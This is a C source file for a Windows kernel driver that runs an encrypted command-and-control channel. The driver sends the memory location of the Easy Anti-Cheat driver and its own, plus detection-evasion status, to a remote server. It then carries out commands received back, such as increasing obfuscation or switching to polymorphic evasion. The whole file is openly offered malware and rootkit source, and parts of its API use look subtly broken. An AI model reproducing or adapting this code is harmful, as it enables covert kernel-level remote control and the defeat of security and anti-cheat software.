#include <ntddk.h>
#include <wsk.h>
#include <ip2string.h>

#include "nn.h"
#include "c2_comm.h"

#define C2_SERVER_IP "127.0.0.1"
#define C2_SERVER_PORT 443

// WSK variables
WSK_CLIENT_DISPATCH WskClientDispatch = { MAKE_WSK_VERSION(1,0), 0, NULL };
WSK_REGISTRATION WskRegistration;
WSK_PROVIDER_NPI WskProviderNpi;
PWSK_SOCKET Socket;

// Encryption key (should be securely generated and stored)
static const UCHAR EncryptionKey[32] = { 0x01, 0x23, 0x45, 0x67, 0x89, 0xAB, 0xCD, 0xEF, /* ... */ };

static void XorEncryptDecrypt(PUCHAR data, SIZE_T length, const UCHAR* key, SIZE_T keyLength) {
    for (SIZE_T i = 0; i < length; i++) {
        data[i] ^= key[i % keyLength];
    }
}

NTSTATUS WskCompletionRoutine(PDEVICE_OBJECT DeviceObject, PIRP Irp, PVOID Context) {
    UNREFERENCED_PARAMETER(DeviceObject);
    UNREFERENCED_PARAMETER(Irp);
    KeSetEvent((PKEVENT)Context, IO_NO_INCREMENT, FALSE);
    return STATUS_MORE_PROCESSING_REQUIRED;
}

VOID WskCloseSocket(PWSK_SOCKET Socket) {
    if (Socket == NULL) return;

    KEVENT event;
    PIRP irp = IoAllocateIrp(1, FALSE);
    if (irp == NULL) return;

    KeInitializeEvent(&event, NotificationEvent, FALSE);
    IoSetCompletionRoutine(irp, WskCompletionRoutine, &event, TRUE, TRUE, TRUE);

    // Use the correct dispatch structure
    ((PWSK_PROVIDER_BASIC_DISPATCH)Socket->Dispatch)->WskCloseSocket(Socket, irp);

    KeWaitForSingleObject(&event, Executive, KernelMode, FALSE, NULL);
    IoFreeIrp(irp);
}

NTSTATUS InitializeWskData(VOID) {
    WSK_CLIENT_NPI wskClientNpi = { NULL, &WskClientDispatch };
    NTSTATUS status = WskRegister(&wskClientNpi, &WskRegistration);
    if (!NT_SUCCESS(status)) return status;

    status = WskCaptureProviderNPI(&WskRegistration, WSK_INFINITE_WAIT, &WskProviderNpi);
    if (!NT_SUCCESS(status)) {
        WskDeregister(&WskRegistration);
        return status;
    }

    return STATUS_SUCCESS;
}

VOID FreeWskData(VOID) {
    if (WskProviderNpi.Client != NULL) {
        WskReleaseProviderNPI(&WskRegistration);
        WskDeregister(&WskRegistration);
    }
}

NTSTATUS ConnectToC2Server(VOID) {
    SOCKADDR_IN serverAddress = { 0 };
    NTSTATUS status;
    KEVENT event;
    PIRP irp;

    serverAddress.sin_family = AF_INET;
    serverAddress.sin_port = RtlUshortByteSwap(C2_SERVER_PORT);
    status = RtlIpv4StringToAddressA(C2_SERVER_IP, FALSE, (PCSTR*)&serverAddress.sin_zero, (PIN_ADDR)&serverAddress.sin_addr);
    if (!NT_SUCCESS(status)) return status;

    irp = IoAllocateIrp(1, FALSE);
    if (irp == NULL) return STATUS_INSUFFICIENT_RESOURCES;

    KeInitializeEvent(&event, NotificationEvent, FALSE);
    IoSetCompletionRoutine(irp, WskCompletionRoutine, &event, TRUE, TRUE, TRUE);

    status = WskProviderNpi.Dispatch->WskSocket(
        WskProviderNpi.Client, AF_INET, SOCK_STREAM, IPPROTO_TCP,
        WSK_FLAG_CONNECTION_SOCKET, NULL, NULL, NULL, NULL, NULL, irp);

    if (status == STATUS_PENDING) {
        KeWaitForSingleObject(&event, Executive, KernelMode, FALSE, NULL);
        status = irp->IoStatus.Status;
    }

    if (NT_SUCCESS(status)) {
        Socket = (PWSK_SOCKET)irp->IoStatus.Information;
    }

    IoFreeIrp(irp);

    if (!NT_SUCCESS(status)) return status;

    irp = IoAllocateIrp(1, FALSE);
    if (irp == NULL) {
        WskCloseSocket(Socket);
        return STATUS_INSUFFICIENT_RESOURCES;
    }

    KeResetEvent(&event);
    IoSetCompletionRoutine(irp, WskCompletionRoutine, &event, TRUE, TRUE, TRUE);

    status = ((PWSK_PROVIDER_CONNECTION_DISPATCH)Socket->Dispatch)->WskConnect(
        Socket, (PSOCKADDR)&serverAddress, 0, irp);

    if (status == STATUS_PENDING) {
        KeWaitForSingleObject(&event, Executive, KernelMode, FALSE, NULL);
        status = irp->IoStatus.Status;
    }

    IoFreeIrp(irp);

    if (!NT_SUCCESS(status)) {
        WskCloseSocket(Socket);
    }

    return status;
}

NTSTATUS SendDataToC2(PUCHAR data, SIZE_T dataLength) {
    WSK_BUF wskBuf;
    KEVENT event;
    PIRP irp;
    NTSTATUS status;

    wskBuf.Offset = 0;
    wskBuf.Length = (ULONG)dataLength;
    wskBuf.Mdl = IoAllocateMdl(data, (ULONG)dataLength, FALSE, FALSE, NULL);
    if (wskBuf.Mdl == NULL) return STATUS_INSUFFICIENT_RESOURCES;

    MmBuildMdlForNonPagedPool(wskBuf.Mdl);

    irp = IoAllocateIrp(1, FALSE);
    if (irp == NULL) {
        IoFreeMdl(wskBuf.Mdl);
        return STATUS_INSUFFICIENT_RESOURCES;
    }

    KeInitializeEvent(&event, NotificationEvent, FALSE);
    IoSetCompletionRoutine(irp, WskCompletionRoutine, &event, TRUE, TRUE, TRUE);

    status = ((PWSK_PROVIDER_CONNECTION_DISPATCH)Socket->Dispatch)->WskSend(Socket, &wskBuf, 0, irp);

    if (status == STATUS_PENDING) {
        KeWaitForSingleObject(&event, Executive, KernelMode, FALSE, NULL);
        status = irp->IoStatus.Status;
    }

    IoFreeIrp(irp);
    IoFreeMdl(wskBuf.Mdl);
    return status;
}

NTSTATUS ReceiveDataFromC2(PUCHAR buffer, SIZE_T bufferSize, PSIZE_T bytesReceived) {
    WSK_BUF wskBuf;
    KEVENT event;
    PIRP irp;
    NTSTATUS status;

    wskBuf.Offset = 0;
    wskBuf.Length = (ULONG)bufferSize;
    wskBuf.Mdl = IoAllocateMdl(buffer, (ULONG)bufferSize, FALSE, FALSE, NULL);
    if (wskBuf.Mdl == NULL) return STATUS_INSUFFICIENT_RESOURCES;

    MmBuildMdlForNonPagedPool(wskBuf.Mdl);

    irp = IoAllocateIrp(1, FALSE);
    if (irp == NULL) {
        IoFreeMdl(wskBuf.Mdl);
        return STATUS_INSUFFICIENT_RESOURCES;
    }

    KeInitializeEvent(&event, NotificationEvent, FALSE);
    IoSetCompletionRoutine(irp, WskCompletionRoutine, &event, TRUE, TRUE, TRUE);

    status = ((PWSK_PROVIDER_CONNECTION_DISPATCH)Socket->Dispatch)->WskReceive(Socket, &wskBuf, 0, irp);

    if (status == STATUS_PENDING) {
        KeWaitForSingleObject(&event, Executive, KernelMode, FALSE, NULL);
        status = irp->IoStatus.Status;
        *bytesReceived = irp->IoStatus.Information;
    }

    IoFreeIrp(irp);
    IoFreeMdl(wskBuf.Mdl);
    return status;
}

NTSTATUS NeuralNetwork_CommunicateWithC2(NeuralNetwork* nn) {
    NTSTATUS status;
    CHAR json_data[4096];
    CHAR recv_buffer[4096];
    SIZE_T bytesReceived;

    status = ConnectToC2Server();
    if (!NT_SUCCESS(status)) return status;

    status = RtlStringCbPrintfA(json_data, sizeof(json_data),
        "{\"type\":\"eac_data\",\"payload\":{"
        "\"eac_base_address\":\"%p\","
        "\"eac_size\":%llu,"
        "\"own_base_address\":\"%p\","
        "\"own_size\":%llu,"
        "\"input_nodes\":%d,"
        "\"hidden_nodes\":%d,"
        "\"output_nodes\":%d,"
        "\"last_obfuscation_key\":%lu"
        "}}",
        nn->eacDriverBase, nn->eacDriverSize,
        nn->ownDriverBase, nn->ownDriverSize,
        nn->inputNodes, nn->hiddenNodes, nn->outputNodes,
        nn->lastObfuscationKey
    );

    if (!NT_SUCCESS(status)) goto cleanup;

    XorEncryptDecrypt((PUCHAR)json_data, strlen(json_data), EncryptionKey, sizeof(EncryptionKey));
    status = SendDataToC2((PUCHAR)json_data, strlen(json_data));
    if (!NT_SUCCESS(status)) goto cleanup;

    status = RtlStringCbPrintfA(json_data, sizeof(json_data),
        "{\"type\":\"debug_info\",\"payload\":{"
        "\"detection_attempt\":%s,"
        "\"high_cpu_usage\":%s,"
        "\"memory_pressure\":%s"
        "}}",
        nn->detectionAttemptObserved ? "true" : "false",
        nn->highCpuUsageObserved ? "true" : "false",
        nn->memoryPressureObserved ? "true" : "false"
    );

    if (!NT_SUCCESS(status)) goto cleanup;

    XorEncryptDecrypt((PUCHAR)json_data, strlen(json_data), EncryptionKey, sizeof(EncryptionKey));
    status = SendDataToC2((PUCHAR)json_data, strlen(json_data));
    if (!NT_SUCCESS(status)) goto cleanup;

    status = RtlStringCbPrintfA(json_data, sizeof(json_data), "{\"type\":\"request_instructions\"}");
    if (!NT_SUCCESS(status)) goto cleanup;

    XorEncryptDecrypt((PUCHAR)json_data, strlen(json_data), EncryptionKey, sizeof(EncryptionKey));
    status = SendDataToC2((PUCHAR)json_data, strlen(json_data));
    if (!NT_SUCCESS(status)) goto cleanup;

    status = ReceiveDataFromC2((PUCHAR)recv_buffer, sizeof(recv_buffer), &bytesReceived);
    if (!NT_SUCCESS(status)) goto cleanup;

    XorEncryptDecrypt((PUCHAR)recv_buffer, bytesReceived, EncryptionKey, sizeof(EncryptionKey));

    PCHAR action = strstr(recv_buffer, "\"action\":\"");
    if (action) {
        action += 10;
        if (strncmp(action, "increase_obfuscation", 20) == 0) {
            NeuralNetwork_IncreaseObfuscation(nn);
        }
        else if (strncmp(action, "change_evasion_technique", 24) == 0) {
            PCHAR technique = strstr(action, "\"technique\":\"");
            if (technique && strncmp(technique + 13, "polymorphic_obfuscation", 23) == 0) {
                NeuralNetwork_ApplyPolymorphicObfuscation(nn);
            }
        }
        else if (strncmp(action, "increase_monitoring", 19) == 0) {
            PCHAR target = strstr(action, "\"target\":\"");
            if (target && strncmp(target + 10, "eac_memory_regions", 18) == 0) {
                NeuralNetwork_IncreasedEACMonitoring(nn);
            }
        }
        else if (strncmp(action, "optimize_performance", 20) == 0) {
            NeuralNetwork_OptimizePerformance(nn);
        }
        else if (strncmp(action, "reduce_memory_footprint", 23) == 0) {
            NeuralNetwork_ReduceMemoryFootprint(nn);
        }
    }




cleanup:
    if (Socket != NULL) {
        WskCloseSocket(Socket);
    }
    return status;
}

NTSTATUS SendDebugMessageToC2(const char* message) {
    static BOOLEAN isConnected = FALSE;

    if (!message) return STATUS_INVALID_PARAMETER;

    if (!isConnected) {
        NTSTATUS status = ConnectToC2Server();
        if (!NT_SUCCESS(status)) return status;
        isConnected = TRUE;
    }

    CHAR json_data[4096];
    int len = RtlStringCchPrintfA(json_data, sizeof(json_data),
        "{\"type\":\"debug_message\",\"payload\":{"
        "\"timestamp\":%lld,"
        "\"message\":\"%s\""
        "}}",
        KeQueryInterruptTime(),
        message
    );

    if (len <= 0 || len >= sizeof(json_data)) return STATUS_BUFFER_OVERFLOW;

    XorEncryptDecrypt((PUCHAR)json_data, len, EncryptionKey, sizeof(EncryptionKey));
    return SendDataToC2((PUCHAR)json_data, len);
}